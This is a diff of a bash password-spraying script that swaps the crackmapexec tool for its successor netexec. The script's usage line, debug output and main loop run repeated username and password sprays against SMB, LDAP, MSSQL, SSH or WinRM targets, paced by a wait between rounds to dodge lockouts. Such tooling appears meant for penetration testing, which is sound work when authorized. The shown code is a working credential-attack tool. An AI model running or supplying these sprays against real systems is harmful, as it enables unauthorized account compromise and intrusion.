@@ -3,7 +3,7 @@
 # Check to ensure all arguments were set
 if [[ "$#" != 7 ]]; then
     echo -e "\e[1;31m!!!! INCORRECT NUMBER OF ARGUMENTS, PLEASE CHECK YOUR COMMAND !!!!"
-    echo -e "\e[1;36m!!!! Usage: cme_spray.sh \e[1;32m{protocol (smb,ldap,mssql,ssh,winrm)} \e[0;32m{# of passwords per spray} \e[1;32m{time to wait between sprays} \e[0;32m{user file} \e[1;32m{password file} \e[0;32m{target} \e[1;32m{test run? prints debug only (y/n)}\e[1;36m !!!!\e[0m"
+    echo -e "\e[1;36m!!!! Usage: nxc_spray.sh \e[1;32m{protocol (smb,ldap,mssql,ssh,winrm)} \e[0;32m{# of passwords per spray} \e[1;32m{time to wait between sprays} \e[0;32m{user file} \e[1;32m{password file} \e[0;32m{target} \e[1;32m{test run? prints debug only (y/n)}\e[1;36m !!!!\e[0m"
     echo -e "\e[1;36m        Example: $0 smb 4 30 creds/users.txt creds/passw.txt 10.0.0.1 n\e[0m"
     exit 0
 fi
@@ -43,9 +43,9 @@ do
             echo -e "\e[34m=====================================\n### DEBUG Time Launched: $currdate\e[0m"
             echo -e "\e[34m### DEBUG Counter: $counter\e[0m"
             echo -e "\e[34m### DEBUG Password: $pass\e[0m"
-            echo -e "\e[34m### DEBUG Command Ran: crackmapexec $proto $target -u $users -p $pass --continue-on-success\e[0m"
+            echo -e "\e[34m### DEBUG Command Ran: netexec $proto $target -u $users -p $pass --continue-on-success\e[0m"
 	    if [ $testrun == "n"  ]; then
-	    	crackmapexec $proto $target -u $users -p $pass --continue-on-success
+	    	netexec $proto $target -u $users -p $pass --continue-on-success
 	    fi
         done
 	((counter=$counter+$pwcounter))
